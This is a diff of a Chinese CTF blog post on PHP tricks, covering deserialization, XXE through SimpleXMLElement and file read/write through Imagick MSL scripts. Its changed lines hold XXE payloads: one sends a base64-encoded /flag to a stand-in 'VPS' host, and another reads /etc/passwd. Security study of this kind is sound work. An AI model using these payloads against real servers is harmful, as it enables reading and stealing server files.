@@ -98,7 +98,7 @@
 }( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
   i.fa.fa-comment
-  .saying--><div class="cxo-profile-inner"><div class="profile-name">Squirt1e</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="https://nese.team/" target="_black">NESE</a></span><span><a href="https://blog.z3ratu1.top/" target="_black">Z3ratu1</a></span><span><a href="https://harmless.blue/" target="_black">CrumbledWall</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Squirt1e's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">PHP的一些trick</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2023-01-16</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="PHP反序列化"> PHP反序列化</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="PHP安全"> PHP安全</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="CTF"> CTF</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">2.2k</span> | Reading time: <span class="post-count">9</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="PHP的一些trick"><a href="#PHP的一些trick" class="headerlink" title="PHP的一些trick"></a>PHP的一些trick</h1><blockquote>
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Squirt1e</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="https://nese.team/" target="_black">NESE</a></span><span><a href="https://blog.z3ratu1.top/" target="_black">Z3ratu1</a></span><span><a href="https://harmless.blue/" target="_black">CrumbledWall</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Squirt1e's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">PHP的一些trick</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2023-01-16</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="PHP反序列化"> PHP反序列化</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="PHP安全"> PHP安全</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="CTF"> CTF</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">2.6k</span> | Reading time: <span class="post-count">12</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="PHP的一些trick"><a href="#PHP的一些trick" class="headerlink" title="PHP的一些trick"></a>PHP的一些trick</h1><blockquote>
 <p>会长期更新的系列，自用。</p>
 </blockquote>
 <h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="Magic-method"><a href="#Magic-method" class="headerlink" title="Magic method"></a>Magic method</h4><ul>
@@ -292,20 +292,20 @@
 <h5 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h5><p>该类接收<code>3</code>个参数。</p>
 <p>通过设置第三个参数<code>dataIsURL</code>为<code> true</code>可以实现远程<code>xml</code>文件的加载。第二个参数的常量值设置为<code>2</code>即可。第一个参数 <code>data</code> 用于引入的外部实体的<code>url</code>。因此我们可以通过它打个XXE。</p>
 <p><strong>evil.xml</strong></p>
-<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE try[
-<!ENTITY % remote SYSTEM "https://VPS/send.xml">
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype">&lt;!DOCTYPE try[
+&lt;!ENTITY % remote SYSTEM "https://VPS/send.xml"></span>
 %remote;
 %all;
 %send;
 ]>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>send.xml</strong></p>
-<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
-<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://VPS/?%payload;'>">
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
+&lt;!ENTITY % all "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'https://VPS/?%payload;'>">
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>也可以直接读文件，就不需要第三个参数了。</p>
-<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version=\"1.0\"?><!DOCTYPE ANY [<!ENTITY f SYSTEM \"file:///etc/passwd\">]><x>&f;</x>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version=\"1.0\"?></span><span class="token doctype">&lt;!DOCTYPE ANY [&lt;!ENTITY f SYSTEM \"file:///etc/passwd\"></span>]><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">></span></span><span class="token entity" title="&f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h4 id="扩展类"><a href="#扩展类" class="headerlink" title="扩展类"></a>扩展类</h4><h5 id="Magick"><a href="#Magick" class="headerlink" title="Magick"></a>Magick</h5><p><code>Imagick</code>拓展类是用于处理图像的，它是通过<code>Magick Scripting Language</code>语法来处理的。</p>
 <p>这个语法可以用来写、转移文件，难点在于它只支持图片格式，如果不是它支持的图片格式的话就报错。</p>
@@ -435,79 +435,79 @@
 <p>最终发现<code>mvg</code>、<code>uyvy</code>、<code>RGB</code>三种格式可以利用。</p>
 <p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1687796509728.png" alt="1687796509728"></p>
 <p>前两个亲测可用。</p>
-<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="UTF-8"?>
-<group>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>
 
-<image>
-<read filename="mvg:/flag" />
-<write filename="/tmp/squirt1e" />
-</image>
-</group>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mvg:/flag<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/tmp/squirt1e<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>最后一个参考作者的<code>exp</code>没成功，记录一下吧，万一以后用得到呢。</p>
-<pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="UTF-8"?>
-<group>
-<!-- step2: copy flag -->
-<image id="a1">
-<!-- 设置为RGB格式，读取flag -->
-<read size="{img_size}x1" filename="rgb:/flag"/>
-</image>
-<image id="w1">
-<!-- 设置⼀个空图⽚ -->
-<read size="10x10" filename="null:"/>
-<!-- 将空图⽚和flag数据进⾏拼接 -->
-<composite image="a1" geometry="+0"/>
-<write filename="rgb:/tmp/ttt1"/>
-</image>
-<image id="a2">
-<!-- 添加偏移后，读取flag -->
-<read size="{img_size}x1+1" filename="rgb:/flag"/>
-</image>
-<image id="w2">
-<read size="10x10" filename="null:"/>
-<composite image="w1" geometry="+0"/>
-<!-- 将上⼀张图⽚和这次读取的flag进⾏拼接 -->
-<composite image="a2" geometry="+1"/>
-<write filename="rgb:/tmp/ttt1"/>
-</image>
-<!-- 不断重复，如果读取超出范围，便会报错，并留下上⼀次写⼊的⽂件 -->
-<image id="a3">
-<read size="{img_size}x1+2" filename="rgb:/flag"/>
-</image>
-<image id="w3">
-<read size="10x10" filename="null:"/>
-<composite image="w2" geometry="+0"/>
-<composite image="a3" geometry="+2"/>
-<write filename="rgb:/tmp/ttt1"/>
-</image>
-<image id="a4">
-<read size="{img_size}x1+3" filename="rgb:/flag"/>
-</image>
-<image id="w4">
-<read size="10x10" filename="null:"/>
-<composite image="w3" geometry="+0"/>
-<composite image="a4" geometry="+3"/>
-<write filename="rgb:/tmp/ttt1"/>
-</image>
-<image id="a5">
-<read size="{img_size}x1+4" filename="rgb:/flag"/>
-</image>
-<image id="w5">
-<read size="10x10" filename="null:"/>
-<composite image="w4" geometry="+0"/>
-<composite image="a5" geometry="+4"/>
-<write filename="rgb:/tmp/ttt1"/>
-</image>
-<image id="a6">
-<read size="{img_size}x1+5" filename="rgb:/flag"/>
-</image>
-<image id="w6">
-<read size="10x10" filename="null:"/>
-<composite image="w5" geometry="+0"/>
-<composite image="a6" geometry="+5"/>
-<write filename="rgb:/tmp/ttt1"/>
-</image>
-</group>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- step2: copy flag --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 设置为RGB格式，读取flag --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 设置⼀个空图⽚ --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 将空图⽚和flag数据进⾏拼接 --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a1<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 添加偏移后，读取flag --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+1<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w1<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 将上⼀张图⽚和这次读取的flag进⾏拼接 --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a2<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token comment" spellcheck="true">&lt;!-- 不断重复，如果读取超出范围，便会报错，并留下上⼀次写⼊的⽂件 --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+2<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w2<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a3<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+2<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+3<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w3<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a4<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+3<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+4<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w4<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a5<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+4<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{img_size}x1+5<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/flag<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>image</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w6<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>read</span> <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10x10<span class="token punctuation">"</span></span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>null:<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w5<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+0<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>composite</span> <span class="token attr-name">image</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a6<span class="token punctuation">"</span></span> <span class="token attr-name">geometry</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>+5<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>write</span> <span class="token attr-name">filename</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rgb:/tmp/ttt1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>image</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="一些脏trick"><a href="#一些脏trick" class="headerlink" title="一些脏trick"></a>一些脏trick</h3><h4 id="php-session-not-started"><a href="#php-session-not-started" class="headerlink" title="php session not started"></a>php session not started</h4><p>想办法整个session，利⽤SESSION UPLOAD PROGRESS创建⼀个 session，这样就可以看到源码了</p>
 <pre class="line-numbers language-http"><code class="language-http">POST / HTTP/1.1
